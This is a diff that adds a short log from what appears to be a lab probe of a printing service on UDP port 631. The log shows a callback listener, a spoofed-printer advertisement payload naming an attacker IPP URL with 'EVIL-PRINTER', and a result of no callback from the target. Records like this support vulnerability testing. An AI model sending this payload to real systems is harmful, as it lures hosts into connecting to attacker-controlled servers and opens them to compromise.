@@ -1,0 +1,5 @@
+2026-11-15 13:53:02,600 INFO IPP callback listener up on 10.13.37.66:16399
+2026-11-15 13:53:02,903 INFO [basic] sending UDP 10.13.37.66:0 -> 10.13.37.10:631 (95 bytes) src_spoofed=False
+2026-11-15 13:53:02,904 DEBUG payload: b'0 3 ipp://10.13.37.66:16399/printers/EVIL-PRINTER "Attacker Controlled" "Totally Legit Printer"'
+2026-11-15 13:53:02,991 INFO waiting up to 3s for the victim to connect back...
+2026-11-15 13:53:06,606 INFO RESULT: no callback observed within 3s
